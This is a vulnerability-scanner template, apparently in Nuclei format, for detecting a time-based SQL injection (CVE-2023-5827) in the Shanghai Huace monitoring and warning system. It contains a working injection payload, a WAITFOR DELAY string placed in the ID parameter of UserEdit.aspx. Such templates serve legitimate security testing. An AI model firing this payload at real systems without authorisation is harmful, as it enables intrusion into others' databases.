id: poc-yaml-huace-monitoring-warning-system-sqli
info:
  name: 上海华测监测预警系统 SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: CVE-2023-5827,sql-injection
  description: |
    This template detects an SQL injection vulnerability in the 上海华测监测预警系统. It leverages a time-based payload to identify the vulnerability.

variables:
  t1: "{{rand_int(5,10)}}"

http:
  - raw:
      - |
        GET /Web/SysManage/UserEdit.aspx?ID=0'WAITFOR+DELAY+'0:0:{{t1}}'--+ HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: body
        words:
          - "/Web/500.html"
          - "Object moved to"
          - "<title>Object moved</title>"
